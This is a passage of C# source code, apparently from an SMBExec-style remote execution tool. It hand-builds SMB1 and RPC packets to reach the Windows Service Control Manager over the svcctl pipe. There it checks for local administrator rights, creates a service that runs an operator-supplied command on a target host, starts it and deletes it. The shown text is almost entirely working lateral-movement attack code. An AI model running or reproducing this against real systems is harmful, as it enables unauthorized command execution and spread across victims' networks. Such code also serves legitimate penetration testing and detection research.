                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    List<byte> SMBExec_Command_List = new List<byte>();
                    foreach (byte commandByte in commandBytes)
                    {
                        SMBExec_Command_List.Add(commandByte);
                        SMBExec_Command_List.Add(0x00);

                    }
                    byte[] SMBExec_Command_Init = SMBExec_Command_List.ToArray();

                    if (Convert.ToBoolean(command.Length % 2))
                    {
                        SMBExec_Command = SMBExec_Command_Init.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                    }
                    else
                    {
                        SMBExec_Command = SMBExec_Command_Init.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    }
                    byte[] SMBExec_Command_Length_bytes = BitConverter.GetBytes(SMBExec_Command.Length / 2);
                    int SMB_Split_Index = 4256;
                    int SMB_Signing_Counter = 0;
                    byte[] SMB_Tree_ID = new byte[2];
                    string SMB_Client_Stage_Next = "";
                    if (ForceSMB1)
                    {
                        SMBClientStage = "TreeConnectAndXRequest";
                        while (SMBClientStage != "exit" && SMBExec_Failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnectAndXRequest":
                                    {
                                        Packet_SMB_Header = new OrderedDictionary();
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x75 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter = 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBTreeConnectAndXRequest(SMB_Path_Bytes);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }

                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CreateAndXRequest";
                                    }
                                    break;
                                case "CreateAndXRequest":
                                    {
                                        SMB_Named_Pipe_Bytes = new byte[] { 0x5c, 0x73, 0x76, 0x63, 0x63, 0x74, 0x6c, 0x00 }; //svcctl
                                        SMB_Tree_ID = Utilities.GetByteRange(SMBClientReceive, 28, 29);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0xa2 }, new byte[] { 0x18 }, new byte[] { 0x02, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBNTCreateAndXRequest(SMB_Named_Pipe_Bytes);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "RPCBind";

                                    }
                                    break;
                                case "RPCBind":
                                    {
                                        SMB_FID = Utilities.GetByteRange(SMBClientReceive, 42, 43);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_RPC_Data = SMBExec.RPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x00, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();

                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }

                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "OpenSCManagerW";
                                    }
                                    break;
                                case "ReadAndXRequest":
                                    {
                                        Thread.Sleep(sleep * 1000);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2e }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBReadAndXRequest(SMB_FID);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = SMB_Client_Stage_Next;
                                    }
                                    break;

                                case "OpenSCManagerW":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }

                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_Bytes, SMB_Service_Length);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, (RPC_Data.Length + SCM_Data.Length));
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "CheckAccess";
                                    }
                                    break;
                                case "CheckAccess":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "00-00-00-00" && BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                        {
                                            SMB_Service_Manager_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 88, 107);
                                            if (SMB_execute)
                                            {
                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                                SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                                if (SCM_Data.Length < SMB_Split_Index)
                                                {
                                                    SMBClientStage = "CreateServiceW";
                                                }
                                                else
                                                {
                                                    SMBClientStage = "CreateServiceW_First";
                                                }
                                            }
                                            else
                                            {
                                                output.AppendLine(String.Format("{0} is a local administrator on {1}", Output_Username, Target));
                                                SMB_Close_Service_Handle_Stage = 2;
                                                SMBClientStage = "CloseServiceHandle";
                                            }

                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "05-00-00-00")
                                        {
                                            output.AppendLine(String.Format("{0} is not a local administrator or does not have the required privileges on {1}", Output_Username, Target));
                                            return output.ToString();
                                        }
                                        else
                                        {
                                            if (debug)
                                            {
                                                output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)));
                                                output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)));
                                            }
                                            output.AppendLine(String.Format("Something went wrong with {0}", Target));
                                            return output.ToString();
                                        }

                                    }

                                    break;

                                case "CreateServiceW":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }

                                        Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "StartServiceW";
                                    }
                                    break;
                                case "CreateServiceW_First":
                                    {
                                        SMB_Split_Stage_final = Math.Ceiling((double)SCM_Data.Length / SMB_Split_Index);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        byte[] SCM_Data_First = Utilities.GetByteRange(SCM_Data, 0, SMB_Split_Index - 1);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_First);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length);
                                        SMB_Split_Index_Tracker = SMB_Split_Index;
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        if (SMB_Split_Stage_final <= 2)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMB_Split_Stage = 2;
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;
                                case "CreateServiceW_Middle":
                                    {
                                        SMB_Split_Stage++;
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        byte[] SCM_Data_Middle = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SMB_Split_Index_Tracker + SMB_Split_Index - 1);
                                        SMB_Split_Index_Tracker += SMB_Split_Index;
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Middle);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length - SMB_Split_Index_Tracker + SMB_Split_Index);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        if (SMB_Split_Stage >= SMB_Split_Stage_final)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }

                                    }
                                    break;

                                case "CreateServiceW_Last":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x48 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        byte[] SCM_Data_Last = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SCM_Data.Length);
                                        SMB_Split_Index_Tracker += SMB_Split_Index;
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Last);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "StartServiceW";
                                    }
                                    break;

                                case "StartServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 112, 115)) == "00-00-00-00")
                                        {
                                            SMB_Service_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 92, 111);
                                            Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                            if (SMB_Signing)
                                            {
                                                Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_Signing_Counter += 2;
                                                SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                            }
                                            Packet_SCM_Data = SMBExec.SCMStartServiceW(SMB_Service_Context_Handle);
                                            SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                            Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                            RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                            Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                            SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                            int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                            NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                            if (SMB_Signing)
                                            {
                                                SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                                SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                                Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                            }
                                            SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_Client_Stage_Next = "DeleteServiceW";
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 112, 115)) == "31-04-00-00")
                                        {
                                            output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_Service, Target));
                                            return output.ToString();
                                        }
                                        else
                                        {
                                            output.AppendLine("Service Creation Fault Context Mismatch");
                                            return output.ToString();
                                        }
                                    }
                                    break;
                                case "DeleteServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "1D-04-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Command Executed with ServiceName: {0} on {1}", SMB_Service, Target)); }
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "02-00-00-00")
                                        {
                                            SMBExec_Failed = true;
                                            if (debug) { output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_Service, Target)); }
                                        }
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }

                                        Packet_SCM_Data = SMBExec.SCMDeleteServiceW(SMB_Service_Context_Handle);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x04, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadAndXRequest";
                                        SMB_Client_Stage_Next = "CloseServiceHandle";
                                        SMB_Close_Service_Handle_Stage = 1;
                                    }
                                    break;
